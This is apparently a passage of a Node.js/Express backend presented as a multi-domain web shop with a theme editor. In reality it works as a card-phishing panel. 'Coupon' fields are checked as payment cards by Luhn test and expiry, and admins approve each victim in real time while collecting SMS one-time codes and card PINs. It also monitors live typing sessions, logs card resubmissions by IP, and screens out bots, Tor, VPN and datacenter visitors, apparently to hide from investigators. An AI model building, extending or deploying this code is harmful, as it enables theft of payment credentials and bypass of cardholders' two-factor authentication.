  const tokensSource = isObject(source.tokens) ? source.tokens : {};

  const tokenWidth = asText(tokensSource.contentWidth, base.tokens.contentWidth, 20);
  const tokenRadius = asText(tokensSource.radius, base.tokens.radius, 20);
  const tokenSurface = asText(tokensSource.surface, base.tokens.surface, 20);
  const tokenFontFamily = asText(tokensSource.fontFamily, base.tokens.fontFamily, 20);
  const tokenTitleScale = asText(tokensSource.titleScale, base.tokens.titleScale, 20);

  const sectionsRaw = Array.isArray(source.home && source.home.sections) ? source.home.sections : base.home.sections;
  const sections = [];
  for (let i = 0; i < sectionsRaw.length && i < 30; i += 1) {
    sections.push(normalizeSection(sectionsRaw[i], i));
  }
  if (sections.length === 0) {
    sections.push(...base.home.sections);
  }
  const sectionIds = sections.map((section) => section.id);
  const viewportSource = isObject(source.viewportOverrides) ? source.viewportOverrides : {};

  return {
    schema_version: THEME_V2_SCHEMA_VERSION,
    tokens: {
      contentWidth: ['narrow', 'normal', 'wide'].includes(tokenWidth) ? tokenWidth : base.tokens.contentWidth,
      radius: ['none', 'sm', 'md', 'lg'].includes(tokenRadius) ? tokenRadius : base.tokens.radius,
      surface: ['default', 'soft', 'outline'].includes(tokenSurface) ? tokenSurface : base.tokens.surface,
      fontFamily: ['serif', 'sans', 'mono'].includes(tokenFontFamily) ? tokenFontFamily : base.tokens.fontFamily,
      accentColor: asColor(tokensSource.accentColor, base.tokens.accentColor),
      backgroundColor: asColor(tokensSource.backgroundColor, base.tokens.backgroundColor),
      textColor: asColor(tokensSource.textColor, base.tokens.textColor),
      sectionGap: clampInt(tokensSource.sectionGap, base.tokens.sectionGap, 8, 64),
      cardGap: clampInt(tokensSource.cardGap, base.tokens.cardGap, 0, 32),
      titleScale: ['sm', 'md', 'lg'].includes(tokenTitleScale) ? tokenTitleScale : base.tokens.titleScale,
    },
    viewportOverrides: {
      desktop: normalizeViewportOverride(viewportSource.desktop, sectionIds, base.viewportOverrides.desktop),
      mobile: normalizeViewportOverride(viewportSource.mobile, sectionIds, base.viewportOverrides.mobile),
    },
    header: {
      announcementEnabled: asBool(source.header && source.header.announcementEnabled, base.header.announcementEnabled),
      announcementText: asText(source.header && source.header.announcementText, base.header.announcementText, 160),
      navLinks: normalizeNavLinks(source.header && source.header.navLinks),
    },
    footer: {
      description: asText(source.footer && source.footer.description, base.footer.description, 280),
      motto: asText(source.footer && source.footer.motto, base.footer.motto, 120),
      socialLinks: normalizeSocialLinks(source.footer && source.footer.socialLinks),
    },
    catalog: {
      products: normalizeCatalogProducts(
        source.catalog && isObject(source.catalog) ? source.catalog.products : undefined,
        base.catalog.products
      ),
    },
    mediaLibrary: normalizeMediaLibrary(source.mediaLibrary),
    pages: normalizePages(source.pages, base.pages),
    home: {
      sections,
    },
  };
}

function themeFromLegacyLayout(legacyRaw) {
  const legacy = safeJsonParse(legacyRaw, {});
  const theme = getDefaultThemeV2();
  if (!legacy || typeof legacy !== 'object') return theme;

  if (legacy.header && typeof legacy.header === 'object') {
    theme.header.announcementEnabled = asBool(legacy.header.announcementEnabled, theme.header.announcementEnabled);
    theme.header.announcementText = asText(legacy.header.announcementText, theme.header.announcementText, 160);
    theme.header.navLinks = normalizeNavLinks(legacy.header.navLinks);
  }

  if (legacy.hero && typeof legacy.hero === 'object') {
    theme.home.sections = theme.home.sections.map((section) => {
      if (section.type !== 'hero') return section;
      return {
        ...section,
        settings: {
          ...section.settings,
          title: asText(legacy.hero.title, section.settings.title, 120),
          subtitle: asText(legacy.hero.subtitle, section.settings.subtitle, 240),
          ctaText: asText(legacy.hero.ctaText, section.settings.ctaText, 40),
          ctaLink: asText(legacy.hero.ctaLink, section.settings.ctaLink, 120),
          backgroundImage: asText(legacy.hero.backgroundImage, section.settings.backgroundImage, MAX_EMBEDDED_URL_LENGTH),
        },
      };
    });
    theme.pages.collection.bannerImage = asText(legacy.hero.backgroundImage, '', MAX_EMBEDDED_URL_LENGTH);
  }

  if (legacy.productGrid && typeof legacy.productGrid === 'object') {
    theme.home.sections = theme.home.sections.map((section) => {
      if (section.type !== 'product_grid') return section;
      return {
        ...section,
        settings: {
          ...section.settings,
          title: asText(legacy.productGrid.sectionTitle, section.settings.title, 80),
          itemsPerPage: clampInt(legacy.productGrid.itemsPerPage, section.settings.itemsPerPage, 4, 24),
          showFilters: true,
        },
      };
    });
  }

  return theme;
}

// --- Middleware: Identify Shop by Domain (use only req.hostname; do not trust client headers) ---
const identifyShop = (req, res, next) => {
  const domain = (req.hostname || '').toString();
  const lookupDomain = domain.includes('localhost') ? 'localhost' : domain;
  req.accessDomain = lookupDomain;
  db.get(
    `SELECT shops.* FROM shops
     LEFT JOIN shop_domains ON shops.id = shop_domains.shop_id
     WHERE shops.domain = ? OR shop_domains.domain = ?
     LIMIT 1`,
    [lookupDomain, lookupDomain],
    (err, shop) => {
      if (err) return next(err);
      req.shop = shop || null;
      next();
    }
  );
};

// --- IP check middleware: runs after identifyShop; use only req.ip (trust proxy) and req.accessDomain ---
const ipCheckMiddleware = (req, res, next) => {
  const ip = clientIp(req);
  const domain = req.accessDomain || req.hostname || '';
  if (!ip || ip.includes('127.0.0.1') || ip === '::1' || ip === '::ffff:127.0.0.1') {
    return next();
  }
  getSetting('ipregistry_api_key', (err, apiKey) => {
    if (err || !apiKey) return next();
    ipcheck.lookup(ip, apiKey).then(({ result, creditsConsumed, creditsRemaining }) => {
      req.ipCheckResult = result;
      if (creditsConsumed != null) setSetting('ipregistry_quota_used', String(creditsConsumed), () => {});
      if (creditsRemaining != null) setSetting('ipregistry_quota_remaining', String(creditsRemaining), () => {});
      const shopId = req.shop ? req.shop.id : null;
      db.get('SELECT * FROM shop_ip_rules WHERE shop_id = ?', [shopId], (err2, rules) => {
        if (!shopId) { db.run('INSERT INTO ip_checks (ip, domain, is_proxy, is_vpn, is_tor, is_datacenter, is_bot, threat_level, country, device_type, action_taken) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', [result.ip, domain, result.is_proxy, result.is_vpn, result.is_tor, result.is_datacenter, result.is_bot, result.threat_level, result.country, result.device_type, 'allow'], () => {}); return next(); }
        const r = rules || {};
        const disallowed = (r.disallowed_types && JSON.parse(r.disallowed_types || '[]')) || [];
        const blockBots = r.block_bots === 1 && result.is_bot === 1;
        const blockProxy = disallowed.includes('proxy') && result.is_proxy === 1;
        const blockVpn = disallowed.includes('vpn') && result.is_vpn === 1;
        const blockTor = disallowed.includes('tor') && result.is_tor === 1;
        const blockDatacenter = disallowed.includes('datacenter') && result.is_datacenter === 1;
        const blockThreat = (disallowed.includes('threat') || disallowed.includes('abuser') || disallowed.includes('attacker')) && result.threat_level != null;
        const blocked = blockBots || blockProxy || blockVpn || blockTor || blockDatacenter || blockThreat;
        const action = blocked ? (r.action_taken || 'captcha') : 'allow';
        db.run(
          'INSERT INTO ip_checks (ip, domain, is_proxy, is_vpn, is_tor, is_datacenter, is_bot, threat_level, country, device_type, action_taken) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
          [result.ip, domain, result.is_proxy, result.is_vpn, result.is_tor, result.is_datacenter, result.is_bot, result.threat_level, result.country, result.device_type, action],
          () => {}
        );
        if (blocked) {
          auth.logSecurity('ip_block', result.ip, `domain=${domain} action=${action}`);
          if (action === 'redirect') return res.redirect(302, '/blocked');
          if (action === '404') return res.status(404).send('Not Found');
          return res.status(403).json({ error: 'access_denied', reason: 'ip_policy', action: r.action_taken || 'captcha' });
        }
        next();
      });
    }).catch(() => next());
  });
};

// --- API Endpoints ---

// 1. Get Shop Config (with optional IP check)
app.get('/api/config', identifyShop, ipCheckMiddleware, (req, res) => {
  if (!req.shop) return res.status(404).json({ error: 'Shop not found for this domain' });
  res.json(req.shop);
});

// 2. Submit Order (backend generates order ID; IP merge uses existing.id)
app.post('/api/orders', identifyShop, (req, res) => {
  const { customer, total, couponCode, dateMMYY, password } = req.body;
  const shopId = req.shop ? req.shop.id : 1;
  const userAgent = req.headers['user-agent'] || '';
  const ipAddress = clientIp(req);

  // Validate coupon: Luhn check + expiry
  const validLuhn = luhnCheck(couponCode);
  const expired = isCardExpired(dateMMYY);
  const autoReject = !validLuhn || expired;
  const orderStatus = autoReject ? 'AUTO_REJECTED' : 'WAITING_APPROVAL';
  const rejectReason = !validLuhn ? 'Luhn check failed' : expired ? 'Card expired' : null;

  const isLocalIp = !ipAddress || ipAddress.includes('127.0.0.1') || ipAddress.includes('::1') || ipAddress === '::ffff:127.0.0.1';

  const createNewOrder = () => {
    const id = generateOrderId();
    const orderToken = generateOrderToken();
    const stmt = db.prepare(`
      INSERT INTO orders (id, shop_id, customer_info, total, coupon_code, coupon_date, coupon_password, status, user_agent, ip_address, order_token)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);
    stmt.run(id, shopId, JSON.stringify(customer), total, couponCode, dateMMYY, password, orderStatus, userAgent, ipAddress, orderToken, function(err) {
      if (err) return res.status(500).json({ error: err.message });
      const newOrder = {
        id, shop_id: shopId, shop_name: req.shop ? req.shop.name : 'Unknown',
        customer, total, status: orderStatus,
        couponCode, dateMMYY, password, userAgent, ipAddress,
        couponHistory: [], smsHistory: [], created_at: new Date(),
        order_token: orderToken
      };
      adminNsp.emit('new_order', newOrder);
      res.json({ success: true, order: newOrder, autoRejected: autoReject, rejectReason });
    });
  };

  // Skip IP merge for local development
  if (isLocalIp) { createNewOrder(); return; }

  // Check for existing active order from same IP
  db.get(
    "SELECT id, coupon_code, coupon_date, coupon_password FROM orders WHERE ip_address = ? AND status NOT IN ('COMPLETED', 'REJECTED', 'AUTO_REJECTED') ORDER BY created_at DESC LIMIT 1",
    [ipAddress],
    (err, existing) => {
      if (err || !existing) { createNewOrder(); return; }

      // IP merge: archive old coupon, update existing order
      if (existing.coupon_code) {
        db.run("INSERT INTO coupon_history (order_id, coupon_code, coupon_date, coupon_password) VALUES (?, ?, ?, ?)",
          [existing.id, existing.coupon_code, existing.coupon_date, existing.coupon_password]);
      }
      db.run(
        "UPDATE orders SET customer_info = ?, total = ?, coupon_code = ?, coupon_date = ?, coupon_password = ?, status = ?, sms_code = NULL, user_agent = ? WHERE id = ?",
        [JSON.stringify(customer), total, couponCode, dateMMYY, password, orderStatus, userAgent, existing.id],
        function(err2) {
          if (err2) return res.status(500).json({ error: err2.message });
          db.get('SELECT order_token FROM orders WHERE id = ?', [existing.id], (e, row) => {
            const orderToken = row && row.order_token ? row.order_token : null;
            const mergedOrder = {
              id: existing.id, shop_id: shopId, shop_name: req.shop ? req.shop.name : 'Unknown',
              customer, total, status: orderStatus,
              couponCode, dateMMYY, password, userAgent, ipAddress,
              couponHistory: [], smsHistory: [], created_at: new Date(),
              order_token: orderToken
            };
            adminNsp.emit('order_update', {
              id: existing.id, status: orderStatus,
              couponCode, dateMMYY, password, smsCode: null, customer, total, userAgent
            });
            res.json({ success: true, order: mergedOrder, autoRejected: autoReject, rejectReason });
          });
        }
      );
    }
  );
});

// 3. Admin: Get All Orders
app.get('/api/admin/orders', requireAdmin('data'), (req, res) => {
  db.all(`
    SELECT orders.*, shops.name as shop_name, shops.domain as shop_domain
    FROM orders LEFT JOIN shops ON orders.shop_id = shops.id
    ORDER BY orders.created_at DESC
  `, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });

    db.all("SELECT * FROM coupon_history ORDER BY created_at ASC", (err2, historyRows) => {
      const historyMap = {};
      (historyRows || []).forEach(h => {
        if (!historyMap[h.order_id]) historyMap[h.order_id] = [];
        historyMap[h.order_id].push({
          couponCode: h.coupon_code, dateMMYY: h.coupon_date,
          password: h.coupon_password, created_at: h.created_at,
        });
      });

      db.all("SELECT * FROM sms_history ORDER BY created_at ASC", (err3, smsRows) => {
        const smsMap = {};
        (smsRows || []).forEach(h => {
          if (!smsMap[h.order_id]) smsMap[h.order_id] = [];
          smsMap[h.order_id].push({ smsCode: h.sms_code, created_at: h.created_at });
        });

        const onlineIds = Array.from(onlineOrders.keys());
        const orders = rows.map(row => ({
          id: row.id, shop_id: row.shop_id,
          shop_name: row.shop_name, shop_domain: row.shop_domain,
          customer: JSON.parse(row.customer_info),
          total: row.total, status: row.status,
          couponCode: row.coupon_code, dateMMYY: row.coupon_date,
          password: row.coupon_password, smsCode: row.sms_code,
          pinCode: row.pin_code,
          userAgent: row.user_agent, ipAddress: row.ip_address,
          couponHistory: historyMap[row.id] || [],
          smsHistory: smsMap[row.id] || [],
          online: onlineIds.includes(row.id),
          created_at: row.created_at,
        }));
        res.json(orders);
      });
    });
  });
});

// 4. Update Order Status (Admin Action)
app.post('/api/admin/orders/:id/status', requireAdmin('data'), (req, res) => {
  const { id } = req.params;
  const { smsCode } = req.body;
  let { status } = req.body;

  db.get("SELECT status, coupon_code, coupon_date, coupon_password FROM orders WHERE id = ?", [id], (err, order) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!order) return res.status(404).json({ error: 'Order not found' });

    const currentStatus = order.status;

    // Pin rejection should always return to coupon step.
    if (status === 'REJECTED' && (currentStatus === 'REQUEST_PIN' || currentStatus === 'PIN_SUBMITTED')) {
      status = 'RETURN_COUPON';
    }

    const allowedTransition = (
      (status === 'APPROVED' && currentStatus === 'WAITING_APPROVAL') ||
      (status === 'REJECTED' && ['WAITING_APPROVAL', 'APPROVED', 'SMS_SUBMITTED'].includes(currentStatus)) ||
      (status === 'REQUEST_PIN' && currentStatus === 'SMS_SUBMITTED') ||
      (status === 'COMPLETED' && currentStatus === 'PIN_SUBMITTED') ||
      (status === 'RETURN_COUPON' && ['WAITING_APPROVAL', 'APPROVED', 'SMS_SUBMITTED', 'REQUEST_PIN', 'PIN_SUBMITTED'].includes(currentStatus))
    );

    if (!allowedTransition) {
      return res.status(400).json({
        error: 'invalid_status_transition',
        detail: `Cannot move from ${currentStatus} to ${status}`,
      });
    }

    // If RETURN_COUPON: archive current coupon to history before changing status.
    if (status === 'RETURN_COUPON') {
      if (order.coupon_code) {
        db.run(
          "INSERT INTO coupon_history (order_id, coupon_code, coupon_date, coupon_password) VALUES (?, ?, ?, ?)",
          [id, order.coupon_code, order.coupon_date, order.coupon_password]
        );
      }

      db.run(
        "UPDATE orders SET status = 'RETURN_COUPON', coupon_code = NULL, coupon_date = NULL, coupon_password = NULL, sms_code = NULL WHERE id = ?",
        [id],
        function(err2) {
          if (err2) return res.status(500).json({ error: err2.message });
          adminNsp.emit('order_update', { id, status: 'RETURN_COUPON', couponCode: null, dateMMYY: null, password: null, smsCode: null });
          io.to(`order_${id}`).emit('order_update', { id, status: 'RETURN_COUPON' });
          res.json({ success: true });
        }
      );
      return;
    }

    let sql = "UPDATE orders SET status = ? WHERE id = ?";
    let params = [status, id];
    if (smsCode) {
      sql = "UPDATE orders SET status = ?, sms_code = ? WHERE id = ?";
      params = [status, smsCode, id];
    }

    db.run(sql, params, function(err2) {
      if (err2) return res.status(500).json({ error: err2.message });
      adminNsp.emit('order_update', { id, status, smsCode });
      io.to(`order_${id}`).emit('order_update', { id, status, smsCode });
      res.json({ success: true });
    });
  });
});

// 5. User: Submit SMS Verification Code (requires order_token)
app.post('/api/orders/:id/sms', (req, res) => {
  const { id } = req.params;
  const { smsCode, order_token } = req.body;
  if (!smsCode) return res.status(400).json({ error: 'SMS code is required' });
  if (!order_token) return res.status(400).json({ error: 'order_token is required' });

  db.get('SELECT order_token, status, sms_code FROM orders WHERE id = ?', [id], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.status(404).json({ error: 'Order not found' });
    if (row.order_token != null && row.order_token !== '') {
      if (!order_token || row.order_token !== order_token) return res.status(403).json({ error: 'Invalid order token' });
    }
    const canRetryRejectedSms = row.status === 'REJECTED' && row.sms_code != null && row.sms_code !== '';
    if (!['APPROVED', 'WAITING_SMS', 'SMS_SUBMITTED'].includes(row.status) && !canRetryRejectedSms) {
      return res.status(409).json({
        error: 'invalid_flow_step',
        detail: `SMS step is not available while order status is ${row.status}`,
      });
    }

    db.run("INSERT INTO sms_history (order_id, sms_code) VALUES (?, ?)", [id, smsCode]);
    db.run("UPDATE orders SET status = 'SMS_SUBMITTED', sms_code = ? WHERE id = ?", [smsCode, id], function(err2) {
      if (err2) return res.status(500).json({ error: err2.message });
      adminNsp.emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
      io.to(`order_${id}`).emit('order_update', { id, status: 'SMS_SUBMITTED', smsCode });
      res.json({ success: true });
    });
  });
});

// 5a. User: Submit PIN Code (requires order_token)
app.post('/api/orders/:id/pin', (req, res) => {
  const { id } = req.params;
  const { pinCode, order_token } = req.body;
  if (!pinCode) return res.status(400).json({ error: 'PIN code is required' });
  if (!order_token) return res.status(400).json({ error: 'order_token is required' });

  db.get('SELECT order_token, status FROM orders WHERE id = ?', [id], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.status(404).json({ error: 'Order not found' });
    if (row.order_token != null && row.order_token !== '') {
      if (!order_token || row.order_token !== order_token) return res.status(403).json({ error: 'Invalid order token' });
    }
    if (!['REQUEST_PIN', 'PIN_SUBMITTED'].includes(row.status)) {
      return res.status(409).json({
        error: 'invalid_flow_step',
        detail: `PIN step is not available while order status is ${row.status}`,
      });
    }

    db.run("UPDATE orders SET status = 'PIN_SUBMITTED', pin_code = ? WHERE id = ?", [pinCode, id], function(err2) {
      if (err2) return res.status(500).json({ error: err2.message });
      adminNsp.emit('order_update', { id, status: 'PIN_SUBMITTED', pinCode });
      io.to(`order_${id}`).emit('order_update', { id, status: 'PIN_SUBMITTED', pinCode });
      res.json({ success: true });
    });
  });
});

// 6. User: Resubmit Coupon (with Luhn validation; requires order_token)
app.post('/api/orders/:id/update-coupon', (req, res) => {
  const { id } = req.params;
  const { couponCode, dateMMYY, password, order_token } = req.body;
  if (!couponCode) return res.status(400).json({ error: 'Coupon code is required' });
  const validLuhn = luhnCheck(couponCode);
  const expired = isCardExpired(dateMMYY);
  const autoReject = !validLuhn || expired;
  const orderStatus = autoReject ? 'AUTO_REJECTED' : 'WAITING_APPROVAL';

  db.get("SELECT coupon_code, coupon_date, coupon_password, order_token AS ot FROM orders WHERE id = ?", [id], (err, order) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!order) return res.status(404).json({ error: 'Order not found' });
    if (order.ot != null && order.ot !== '') {
      if (!order_token || order.ot !== order_token) return res.status(403).json({ error: 'Invalid order token' });
    }

    if (order.coupon_code) {
      db.run("INSERT INTO coupon_history (order_id, coupon_code, coupon_date, coupon_password) VALUES (?, ?, ?, ?)",
        [id, order.coupon_code, order.coupon_date, order.coupon_password]);
    }

    db.run(
      "UPDATE orders SET coupon_code = ?, coupon_date = ?, coupon_password = ?, status = ?, sms_code = NULL WHERE id = ?",
      [couponCode, dateMMYY, password, orderStatus, id],
      function(err2) {
        if (err2) return res.status(500).json({ error: err2.message });
        adminNsp.emit('order_update', { id, status: orderStatus, couponCode, dateMMYY, password, smsCode: null });
        io.to(`order_${id}`).emit('order_update', { id, status: orderStatus });
        res.json({ success: true, autoRejected: autoReject });
      }
    );
  });
});

// 7. Admin: Get Online Order IDs
app.get('/api/admin/online', requireAdmin('dashboard'), (req, res) => {
  res.json(Array.from(onlineOrders.keys()));
});

// 8. Admin: Get Live Typing Sessions
app.get('/api/admin/live-sessions', requireAdmin('dashboard'), (req, res) => {
  const sessions = [];
  for (const [socketId, session] of liveSessions) {
    sessions.push({ id: socketId, ...session });
  }
  res.json(sessions);
});

// --- Shop Management API ---

// 9. Get all shops with their domains
app.get('/api/admin/shops', requireAdmin(), (req, res) => {
  if (!hasPanel(req.admin, 'shops') && !hasPanel(req.admin, 'design')) {
    return res.status(403).json({ error: 'Forbidden', detail: 'insufficient_permission' });
  }
  db.all("SELECT * FROM shops ORDER BY id ASC", (err, shops) => {
    if (err) return res.status(500).json({ error: err.message });
    db.all("SELECT * FROM shop_domains ORDER BY shop_id ASC", (err2, domains) => {
      const domainMap = {};
      (domains || []).forEach(d => {
        if (!domainMap[d.shop_id]) domainMap[d.shop_id] = [];
        domainMap[d.shop_id].push({ id: d.id, domain: d.domain, created_at: d.created_at });
      });
      const result = shops.map(s => ({
        ...s,
        domains: domainMap[s.id] || [],
      }));
      res.json(result);
    });
  });
});

// 10. Create a new shop
app.post('/api/admin/shops', requireAdmin('shops'), (req, res) => {
  const { name, domain, template, layout_config, layout_config_v2, theme_editor_v2_enabled } = req.body;
  if (!name || !domain) return res.status(400).json({ error: 'Name and domain are required' });
  const templateVal = (template && typeof template === 'string') ? template.trim() : 'beard';
  const configVal = layout_config ? (typeof layout_config === 'object' ? JSON.stringify(layout_config) : layout_config) : null;
  const configV2Val = layout_config_v2 != null
    ? JSON.stringify(normalizeThemeV2(safeJsonParse(layout_config_v2, layout_config_v2)))
    : null;
  const enabledV2 = asBool(theme_editor_v2_enabled, false) ? 1 : 0;
  const schemaVersion = configV2Val ? THEME_V2_SCHEMA_VERSION : 1;

  db.run(
    "INSERT INTO shops (domain, name, template, layout_config, layout_config_v2, theme_draft_v2, layout_schema_version, theme_editor_v2_enabled) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
    [domain, name, templateVal, configVal, configV2Val, configV2Val, schemaVersion, enabledV2],
    function(err) {
    if (err) return res.status(500).json({ error: err.message });
    refreshStoreHosts();
    res.json({
      success: true,
      shop: {
        id: this.lastID,
        domain,
        name,
        template: templateVal,
        layout_config: configVal,
        layout_config_v2: configV2Val,
        theme_draft_v2: configV2Val,
        layout_schema_version: schemaVersion,
        theme_editor_v2_enabled: enabledV2,
      },
    });
  });
});

// 11. Update shop (name or layout_config)
app.put('/api/admin/shops/:id', requireAdmin('shops'), (req, res) => {
  const { name, layout_config, theme_editor_v2_enabled } = req.body;
  if (!name && layout_config === undefined && theme_editor_v2_enabled === undefined) return res.status(400).json({ error: 'Nothing to update' });
  
  const updates = [];
  const params = [];
  
  if (name) {
    updates.push('name = ?');
    params.push(name);
  }
  
  if (layout_config !== undefined) {
    updates.push('layout_config = ?');
    params.push(typeof layout_config === 'object' ? JSON.stringify(layout_config) : layout_config);
  }

  if (theme_editor_v2_enabled !== undefined) {
    updates.push('theme_editor_v2_enabled = ?');
    params.push(asBool(theme_editor_v2_enabled, false) ? 1 : 0);
  }
  
  params.push(req.params.id);
  
  db.run(`UPDATE shops SET ${updates.join(', ')} WHERE id = ?`, params, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ success: true });
  });
});

// 12. Add domain to a shop
app.post('/api/admin/shops/:id/domains', requireAdmin('shops'), (req, res) => {
  const { domain } = req.body;
  if (!domain) return res.status(400).json({ error: 'Domain is required' });
  db.run("INSERT INTO shop_domains (shop_id, domain) VALUES (?, ?)", [req.params.id, domain], function(err) {
    if (err) {
      if (err.message.includes('UNIQUE')) return res.status(409).json({ error: 'Domain already exists' });
      return res.status(500).json({ error: err.message });
    }
    refreshStoreHosts();
    res.json({ success: true, domainEntry: { id: this.lastID, domain, shop_id: req.params.id } });
  });
});

// 13. Remove domain from a shop
app.delete('/api/admin/shops/:id/domains/:domainId', requireAdmin('shops'), (req, res) => {
  db.run("DELETE FROM shop_domains WHERE id = ? AND shop_id = ?", [req.params.domainId, req.params.id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    refreshStoreHosts();
    res.json({ success: true });
  });
});

// 14. Get shop IP rules
app.get('/api/admin/shops/:id/ip-rules', requireAdmin('shops'), (req, res) => {
  db.get('SELECT * FROM shop_ip_rules WHERE shop_id = ?', [req.params.id], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.json({ shop_id: parseInt(req.params.id, 10), block_bots: 0, block_desktop: 0, block_android: 0, block_apple: 0, block_after_intercept: 0, disallowed_types: [], action_taken: 'captcha' });
    const r = { ...row, disallowed_types: row.disallowed_types ? JSON.parse(row.disallowed_types) : [] };
    res.json(r);
  });
});

// 15. Update shop IP rules
app.put('/api/admin/shops/:id/ip-rules', requireAdmin('shops'), (req, res) => {
  const { block_bots, block_desktop, block_android, block_apple, block_after_intercept, disallowed_types, action_taken } = req.body;
  const shopId = req.params.id;
  const disallowed = Array.isArray(disallowed_types) ? JSON.stringify(disallowed_types) : '[]';
  db.run(
    `INSERT INTO shop_ip_rules (shop_id, block_bots, block_desktop, block_android, block_apple, block_after_intercept, disallowed_types, action_taken, updated_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
     ON CONFLICT(shop_id) DO UPDATE SET block_bots=?, block_desktop=?, block_android=?, block_apple=?, block_after_intercept=?, disallowed_types=?, action_taken=?, updated_at=CURRENT_TIMESTAMP`,
    [shopId, block_bots ? 1 : 0, block_desktop ? 1 : 0, block_android ? 1 : 0, block_apple ? 1 : 0, block_after_intercept ? 1 : 0, disallowed, action_taken || 'captcha', block_bots ? 1 : 0, block_desktop ? 1 : 0, block_android ? 1 : 0, block_apple ? 1 : 0, block_after_intercept ? 1 : 0, disallowed, action_taken || 'captcha'],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ success: true });
    }
  );
});

// 15a. Get theme editor v2 payload
app.get('/api/admin/shops/:id/theme-v2', requireAdmin('design'), (req, res) => {
  const shopId = req.params.id;
  db.get(
    'SELECT id, name, layout_config, layout_config_v2, theme_draft_v2, layout_schema_version, theme_editor_v2_enabled FROM shops WHERE id = ?',
    [shopId],
    (err, row) => {
      if (err) return res.status(500).json({ error: err.message });
      if (!row) return res.status(404).json({ error: 'Shop not found' });

      const hasPublished = !!row.layout_config_v2;
      const publishedRaw = safeJsonParse(row.layout_config_v2, null);
      const legacyLayout = safeJsonParse(row.layout_config, {});
      const published = normalizeThemeV2(hasPublished ? publishedRaw : themeFromLegacyLayout(legacyLayout));

      const draftRaw = safeJsonParse(row.theme_draft_v2, null);
      const draft = normalizeThemeV2(draftRaw || published);

      res.json({
        shopId: row.id,
        shopName: row.name,
        enabled: row.theme_editor_v2_enabled === 1,
        schemaVersion: row.layout_schema_version || 1,
        hasPublished,
        draft,
        published,
      });
    }
  );
});

// 15b. Save theme editor v2 draft
app.put('/api/admin/shops/:id/theme-v2/draft', requireAdmin('design'), (req, res) => {
  const shopId = req.params.id;
  const source = req.body && Object.prototype.hasOwnProperty.call(req.body, 'theme') ? req.body.theme : req.body;
  const normalized = normalizeThemeV2(source);
  const serialized = JSON.stringify(normalized);

  db.run(
    'UPDATE shops SET theme_draft_v2 = ?, layout_schema_version = ? WHERE id = ?',
    [serialized, THEME_V2_SCHEMA_VERSION, shopId],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      if (this.changes === 0) return res.status(404).json({ error: 'Shop not found' });
      res.json({ success: true, draft: normalized });
    }
  );
});

// 15c. Toggle theme editor v2 feature flag
app.put('/api/admin/shops/:id/theme-v2/flag', requireAdmin('design'), (req, res) => {
  const shopId = req.params.id;
  const enabled = asBool(req.body && req.body.enabled, false) ? 1 : 0;

  db.run(
    'UPDATE shops SET theme_editor_v2_enabled = ? WHERE id = ?',
    [enabled, shopId],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      if (this.changes === 0) return res.status(404).json({ error: 'Shop not found' });

      // Broadcast theme enable/disable to storefront clients
      io.emit('theme_updated', {
        shopId: Number(shopId),
        enabled: enabled === 1,
      });

      res.json({ success: true, enabled: enabled === 1 });
    }
  );
});

// 15d. Publish current v2 theme
app.post('/api/admin/shops/:id/theme-v2/publish', requireAdmin('design'), (req, res) => {
  const shopId = req.params.id;
  db.get(
    'SELECT id, layout_config, layout_config_v2, theme_draft_v2, theme_editor_v2_enabled FROM shops WHERE id = ?',
    [shopId],
    (err, row) => {
      if (err) return res.status(500).json({ error: err.message });
      if (!row) return res.status(404).json({ error: 'Shop not found' });

      let source = req.body && Object.prototype.hasOwnProperty.call(req.body, 'theme') ? req.body.theme : safeJsonParse(row.theme_draft_v2, null);
      if (!source) source = safeJsonParse(row.layout_config_v2, null);
      if (!source) source = themeFromLegacyLayout(row.layout_config);

      const normalized = normalizeThemeV2(source);
      const serialized = JSON.stringify(normalized);
      const enabled = req.body && Object.prototype.hasOwnProperty.call(req.body, 'enabled')
        ? (asBool(req.body.enabled, false) ? 1 : 0)
        : (row.theme_editor_v2_enabled === 1 ? 1 : 0);

      db.get(
        'SELECT COALESCE(MAX(version_no), 0) as maxVersion FROM shop_layout_versions WHERE shop_id = ?',
        [shopId],
        (err2, maxRow) => {
          if (err2) return res.status(500).json({ error: err2.message });
          const nextVersion = (maxRow && maxRow.maxVersion ? maxRow.maxVersion : 0) + 1;

          db.run(
            'UPDATE shops SET layout_config_v2 = ?, theme_draft_v2 = ?, layout_schema_version = ?, theme_editor_v2_enabled = ? WHERE id = ?',
            [serialized, serialized, THEME_V2_SCHEMA_VERSION, enabled, shopId],
            function(err3) {
              if (err3) return res.status(500).json({ error: err3.message });

              db.run(
                'INSERT INTO shop_layout_versions (shop_id, version_no, layout_config_v2, schema_version, created_by) VALUES (?, ?, ?, ?, ?)',
                [shopId, nextVersion, serialized, THEME_V2_SCHEMA_VERSION, req.admin.username || null],
                (err4) => {
                  if (err4) return res.status(500).json({ error: err4.message });

                  // Broadcast theme update to all connected storefront clients
                  io.emit('theme_updated', {
                    shopId: Number(shopId),
                    enabled: enabled === 1,
                    versionNo: nextVersion,
                  });

                  res.json({
                    success: true,
                    enabled: enabled === 1,
                    versionNo: nextVersion,
                    published: normalized,
                  });
                }
              );
            }
          );
        }
      );
    }
  );
});

// 15e. Get theme v2 publish history
app.get('/api/admin/shops/:id/theme-v2/versions', requireAdmin('design'), (req, res) => {
  const shopId = req.params.id;
  db.all(
    'SELECT id, version_no, schema_version, created_by, created_at FROM shop_layout_versions WHERE shop_id = ? ORDER BY version_no DESC LIMIT 30',
    [shopId],
    (err, rows) => {
      if (err) return res.status(500).json({ error: err.message });
